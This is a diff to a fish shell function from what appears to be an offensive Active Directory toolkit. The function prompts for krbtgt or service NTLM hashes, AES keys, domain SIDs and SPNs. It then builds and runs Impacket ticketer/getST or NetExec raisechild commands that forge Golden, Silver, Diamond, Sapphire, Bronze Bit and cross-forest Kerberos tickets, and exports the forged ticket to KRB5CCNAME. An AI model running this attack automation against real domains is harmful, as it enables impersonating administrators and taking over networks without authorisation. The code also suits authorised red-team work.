@@ -59,7 +59,7 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     if test "$wizard" -eq 1
         set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
         
-        # Target (for all)
+        # 0. Target (IP/Hostname)
         set -l def_target "$__KRONOS_CACHE_TICKET_TARGET"
         set -l src_target "Cache"
         if test -z "$def_target"
@@ -68,10 +68,11 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
             if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
             if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
         end
+        if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
         set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
         set -U __KRONOS_CACHE_TICKET_TARGET "$target"
 
-        # Domain
+        # 1. Domain
         set -l def_domain "$__KRONOS_CACHE_TICKET_DOMAIN"
         set -l src_domain "Cache"
         if test -z "$def_domain"
@@ -82,21 +83,30 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
         set -U __KRONOS_CACHE_TICKET_DOMAIN "$domain"
 
-        # 1. Hash/Credentials depending on subaction
-        if test "$subaction" = "cross-forest"
-            # Cross-forest (NetExec raisechild) needs valid child domain credentials
+        # 2. Authentication Credentials (Diamond, Sapphire, Bronze, Cross-Forest)
+        if contains -- "$subaction" diamond sapphire bronze cross-forest
+            set -l user_label "Auth Username"
+            if test "$subaction" = "bronze"; set user_label "Service Account Username"; end
+            if test "$subaction" = "cross-forest"; set user_label "Child Domain Auth Username"; end
+            
             set -l def_auth_user "$__KRONOS_CACHE_TICKET_AUTH_USER"
             set -l src_user "Cache"
             if test -z "$def_auth_user"
                 set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                 if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
             end
-            set auth_user (__kronos_ask "Child Domain Auth Username" "$def_auth_user" "$src_user"); or return 1
+            if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
+            set auth_user (__kronos_ask "$user_label" "$def_auth_user" "$src_user"); or return 1
             set -U __KRONOS_CACHE_TICKET_AUTH_USER "$auth_user"
 
             set -l def_auth_val "$__KRONOS_CACHE_TICKET_AUTH_VAL"
             set -l src_auth_val "Cache"
-            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"; end
+            if test -z "$def_auth_val"
+                set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
+                if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end
+            end
+            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
+            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
             set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
             set -U __KRONOS_CACHE_TICKET_AUTH_VAL "$auth_input"
             
@@ -105,10 +115,10 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
             else
                 set auth_pass "$auth_input"; set auth_hash ""
             end
-            
-            set etype (__kronos_ask_choice "Encryption Type" "aes256" "aes256" "rc4"); or return 1
-        
-        else if test "$subaction" != "bronze"
+        end
+
+        # 3. Hash (NTLM of krbtgt or Service) - Golden/Silver/Diamond/Sapphire/Trust
+        if contains -- "$subaction" golden silver diamond sapphire trust
             set -l hash_label "Target NTLM Hash"
             switch "$subaction"
                 case golden diamond sapphire; set hash_label "krbtgt NTLM Hash"
@@ -123,8 +133,8 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
             set -U __KRONOS_CACHE_HASH "$hash"
         end
 
-        # 2. AES / SID (for Impacket ticketer)
-        if contains -- "$subaction" golden diamond sapphire silver trust
+        # 4. AES / SID / SPN
+        if test "$subaction" != "cross-forest"
             if contains -- "$subaction" golden diamond sapphire
                 set -l def_aes "$__KRONOS_CACHE_AES_KEY"
                 if test -n "$aes_key"; set def_aes "$aes_key"; end
@@ -132,14 +142,21 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
                 set -U __KRONOS_CACHE_AES_KEY "$aes_key"
             end
 
-            set -l def_sid "$__KRONOS_CACHE_SID"
-            if test -n "$sid"; set def_sid "$sid"; end
-            set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
-            set -U __KRONOS_CACHE_SID "$sid"
-        end
+            if contains -- "$subaction" golden silver diamond sapphire trust
+                set -l def_sid "$__KRONOS_CACHE_SID"
+                if test -n "$sid"; set def_sid "$sid"; end
+                set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
+                set -U __KRONOS_CACHE_SID "$sid"
+            end
 
-        # 3. User (Impersonated)
-        if test "$subaction" != "cross-forest"
+            if contains -- "$subaction" silver bronze trust
+                set -l def_spn "$__KRONOS_CACHE_TICKET_SPN"
+                if test -n "$spn"; set def_spn "$spn"; end
+                set spn (__kronos_ask "Target SPN (e.g. cifs/srv01.domain.local)" "$def_spn"); or return 1
+                set -U __KRONOS_CACHE_TICKET_SPN "$spn"
+            end
+
+            # Impersonated User
             set -l user_prompt "User to Impersonate"
             if test "$subaction" = "sapphire"; set user_prompt "User to Impersonate (via S4U2Self)"; end
             set -l def_user "$__KRONOS_CACHE_USER"
@@ -147,53 +164,26 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
             if test -n "$user"; set def_user "$user"; end
             set user (__kronos_ask "$user_prompt" "$def_user"); or return 1
             set -U __KRONOS_CACHE_USER "$user"
-        end
-
-        # 4. SPN (Silver/Bronze)
-        if test "$subaction" = "silver" -o "$subaction" = "bronze" -o "$subaction" = "trust"
-            set -l def_spn "$__KRONOS_CACHE_TICKET_SPN"
-            if test -n "$spn"; set def_spn "$spn"; end
-            set spn (__kronos_ask "Target SPN (e.g. cifs/srv01.domain.local)" "$def_spn"); or return 1
-            set -U __KRONOS_CACHE_TICKET_SPN "$spn"
-        end
-
-        # 5. Auth Credentials (Diamond, Sapphire, Bronze)
-        if contains -- "$subaction" diamond sapphire bronze
-            set -l user_label "Auth Username"
-            if test "$subaction" = "bronze"; set user_label "Service Account Username"; end
-            
-            set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
-            set -l src_user "Cache"
-            if test -z "$def_auth_user"
-                set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
-            end
-            if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
-            set auth_user (__kronos_ask "$user_label" "$def_auth_user" "$src_user"); or return 1
-            set -U __KRONOS_CACHE_AUTH_USER "$auth_user"
-
-            set -l def_auth_val "$__KRONOS_CACHE_AUTH_VAL"
-            set -l src_auth_val "Cache"
-            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"; end
-            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
-            set -U __KRONOS_CACHE_AUTH_VAL "$auth_input"
-            
-            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
-                set auth_hash "$auth_input"; set auth_pass ""
-            else
-                set auth_pass "$auth_input"; set auth_hash ""
-            end
+        else
+            # Cross-forest ETYPE
+            set etype (__kronos_ask_choice "Encryption Type" "aes256" "aes256" "rc4"); or return 1
         end
     else
         # Fallbacks for non-wizard mode
         if test -z "$target"; set target "$TGT"; end
-        if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
+        if test -z "$domain"
+            set domain "$__KRONOS_CACHE_TICKET_DOMAIN"
+            if test -z "$domain"; set domain "$TGT_HOSTS[1]"; end
+            if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
+        end
         if test -z "$user"; set user "Administrator"; end
     end
+
+    if test -z "$target"; echo "error: target is required"; return 1; end
 
     set -l final_cmd ""
 
     if test "$subaction" = "bronze"
-        # Bronze Bit uses getST.py
         set -l impacket_cmd ""
         if command -v getST.py >/dev/null; set impacket_cmd getST.py
         else if command -v impacket-getST >/dev/null; set impacket_cmd impacket-getST
@@ -209,22 +199,18 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set final_cmd "$impacket_cmd "(string join ' ' -- $st_args)
 
     else if test "$subaction" = "cross-forest"
-        # Automated Cross-Forest/RaiseChild using NetExec
         __kronos_check_dep nxc; or return 1
         set -l nxc_args ldap "$target" -u "$auth_user"
         if test -n "$domain"; set nxc_args -d "$domain"; end
-        
         if test -n "$auth_hash"
             set -a nxc_args -H "$auth_hash"
         else
             set -a nxc_args -p "$auth_pass"
         end
-        
         set -a nxc_args -M raisechild -o ETYPE="$etype"
         set final_cmd "nxc "(string join ' ' -- $nxc_args)
 
     else
-        # All others use ticketer.py
         set -l impacket_cmd ""
         if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
         else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
@@ -249,13 +235,12 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
                 set final_target_user "baduser"
             case silver trust
                 set -a ticket_args -spn "$spn"
-            case cross-forest
-                set -a ticket_args -extra-sid "$extra_sid"
         end
         set -a ticket_args "$final_target_user"
         set final_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
     end
 
+    if test -z "$final_cmd"; echo "error: invalid ticket type"; return 1; end
     if set -q _flag_edit_cmd; set final_cmd (__kronos_edit_cmd "$final_cmd"); or return 1; end
 
     set -l bin (string split ' ' -- $final_cmd)[1]
@@ -264,19 +249,17 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     echo "[*] Executing $subaction ticket attack via $bin..."
     eval $final_cmd
     
-    # Post-execution logic (exporting tickets etc.)
+    # Post-execution logic
     set -l forged_user "$user"
     if test "$subaction" = "sapphire"; set forged_user "baduser"; end
-    if test "$subaction" = "cross-forest"; set forged_user "Administrator"; end # NetExec usually saves as Administrator.ccache
+    if test "$subaction" = "cross-forest"; set forged_user "Administrator"; end
     
     if test -f "$forged_user.ccache"
         set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
         echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
     else
-        # Fallback search for any newly created .ccache
         set -l latest_ccache (ls -t *.ccache 2>/dev/null | head -n 1)
         if test -n "$latest_ccache"
-            # Check if it was created in the last 10 seconds
             set -gx KRB5CCNAME "$PWD/$latest_ccache"
             echo "[+] Detected new ticket and exported to KRB5CCNAME=$KRB5CCNAME"
         end
